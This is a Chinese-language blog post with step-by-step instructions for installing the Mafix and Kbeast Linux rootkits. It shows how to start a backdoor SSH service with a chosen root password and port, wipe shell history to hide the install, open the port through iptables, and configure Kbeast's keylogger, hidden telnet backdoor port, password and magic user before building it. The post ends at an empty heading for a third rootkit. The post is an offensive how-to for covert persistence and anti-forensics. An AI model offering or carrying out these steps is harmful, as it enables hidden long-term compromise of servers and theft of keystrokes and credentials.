---
layout: post
title: linux rootkit
categories: linux
tag: linux
---
# linux rootkit
## Mafix
它轻量级的应用层rootkit,提供了一个ssh连接，但隐藏效果不好。  
1. tar zxvf mafix_rootkit.tar.gz 解压。进入目录并用root权限运行。
2. ./root pass port (如: ./root 123456 8822 那么下次连接的时候只需用putty连接它的8822端口，用户名是root，密码为123456)
3. 安装完成后会自动删除目录，为了隐蔽，用 history -c 清除下命令就行

过防火墙
可以直接在系统里加个iptables规则就可以了。  
`iptables -t filter -A INPUT -p all --dport 22222 -j ACCEPT`

---

## Kbeast rootkit
内核级rootkit，功能相当强大，能反向连接，还能键盘记录，而且适用范围很广~
安装脚本支持的内核版本有2.6.16, 2.6.18, 2.6.32, and 2.6.35。
1. tar zxvf ipsecs-kbeast-v1.tar.gz
2. vi config.h
```
#define _LOGFILE_ “acctlog”          键盘记录
#define _HIDE_PORT_ 13377            后门telnet端口
#define _RPASSWORD_ “123456″         后门密码
#define _MAGIC_NAME_ “admin”         后门用户（这里特别注意必须是具有sh/bash权限的用户）
```
3. - ./setup build 0（适用于kernel 2.6.18）
   - ./setup build （适用于kernel 2.6.32，也应该能用于2.6.24或者更多）

4. tips 如果`Compiling Kernel Module : [NOT OK]``那就是这台服务器缺少`kernel-header`  

  可尝试`apt-get install kernel-headers-$(uname -r) ls -d /lib/modules/$(uname -r)/build`


---

## rootkit-ddrk
